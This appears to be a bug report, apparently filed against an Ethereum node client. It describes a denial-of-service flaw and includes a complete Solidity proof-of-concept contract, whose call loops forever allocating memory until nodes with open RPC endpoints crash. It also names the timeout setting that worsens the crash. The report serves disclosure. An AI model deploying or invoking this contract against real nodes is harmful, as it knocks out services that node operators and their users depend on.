  "body": "Hi, I experienced a node crash that can be easily done via contract execution call. The only thing I need to exploit is a simple contract deployment like the one below.  \r\n\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Test {\r\n    constructor(){}\r\n    uint constant s = 1000000000;\r\n\r\n    function test() public pure returns (uint) {\r\n        uint[] memory a;\r\n        while(true) {\r\n            for (uint i=0; i<s; i++) {\r\n                a = new uint[](s);\r\n                a[i] = i;\r\n            }\r\n        }\r\n        return 123;\r\n    }\r\n}\r\n```\r\n\r\nAny node that invokes the `test` function will make OOM and causes the OS to crash even.  Once the contract is deployed, the `test` call can be invoked all the lifetime. Also, a node with `--rpc.evmtimeout 0s` flag is more sensible to make OS crash. \r\n\r\nTarget: any nodes that open RPC endpoint.\r\n\r\nCost: small ether for initial contract deployment\r\n\r\nImplication: Crashing server or node's process",
